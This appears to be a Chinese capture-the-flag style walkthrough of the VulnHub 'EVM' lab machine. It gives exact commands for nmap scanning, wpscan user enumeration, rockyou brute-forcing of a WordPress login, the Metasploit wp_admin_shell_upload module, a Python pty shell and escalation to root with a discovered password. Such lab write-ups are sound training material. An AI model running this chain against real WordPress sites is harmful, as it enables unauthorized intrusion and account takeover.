# EVM

## 一、描述

```text
VM名称：EVM
下载（镜像）：https://www.vulnhub.com/entry/evm-1,391
描述：这是超级友好的盒子
```

## 二、开始训练

环境开启正常

![image-20210309101151536](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309101151536.png)

使用nmap进行子网扫描

```text
nmap 192.168.1.238/24
```

![image-20210309104131719](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309104131719.png)

成功发现靶机iP

尝试访问

![image-20210309104501729](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309104501729.png)

使用nmap对这个IP进行详细扫描

```text
nmap -A 192.168.1.234
```

![image-20210309104730184](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309104730184.png)

![image-20210309104749471](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309104749471.png)

没什么有用的信息

回到网页

![image-20210309115209456](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309115209456.png)

发现一句提醒，该网站似乎有wordpress框架

在kali中使用wpscan对该网站进行扫描

```text
wpscan --url http://192.168.1.234/wordpress -e ap -e at -e u
```

![image-20210309115648944](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309115648944.png)

![image-20210309115731786](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309115731786.png)

使用工具爆破密码

```text
wpscan --url http://192.168.1.234/wordpress -U c0rrupt3d_brain -P /usr/share/wordlists/rockyou.txt
```

> 初始状态下的rockyou.txt是被压缩的状态，可以在root权限下使用以下命令解压

```text
gunzip rockyou.txt.gz
```

![image-20210309120455768](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309120455768.png)

爆破中......

![image-20210309120656786](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309120656786.png)

爆破出密码为

```text
24992499
```

接下来我们可以使用Metasploit的内置wordpress漏洞。

首先，通过输入以下命令启动Metasploit

```text
msfconsole
```

然后依次输入以下命令：

```text
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RhOSTS 192.168.1.234
set USERNAME c0rrupt3d_brain
set PassWORD 24992499
set targeturi /wordpress
run
```

![image-20210309121106040](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309121106040.png)

![image-20210309121121357](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309121121357.png)

这时我们就成功的拿到了标准shell

进入home目录下查找用户文件夹，发现有一个root3r的目录，进入之后发现有一个.root\_password.ssh.txt的文件

![image-20210309121354499](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309121354499.png)

我们使用cat命令查看此文件

```text
cat.root_password.ssh.txt
```

![image-20210309121609925](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309121609925.png)

得到了SSH的密码

> 从python命令提示符到交互式shell：import pty pty.spawn\(“/bin/bash”\)

使用Python模拟交互式终端

```text
shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

![image-20210309122326694](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309122326694.png)

获得root权限

```text
su root
willy26
```

![image-20210309122522473](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309122522473.png)

进入root目录下，发现proof.txt文件

使用cat命令查看

```text
voila you have successfully pwned me :) !!!
:D
```

![image-20210309122741033](https://gitee.com/YiGaoyu/pic_repo/raw/master/image-20210309122741033.png)

靶机训练结束

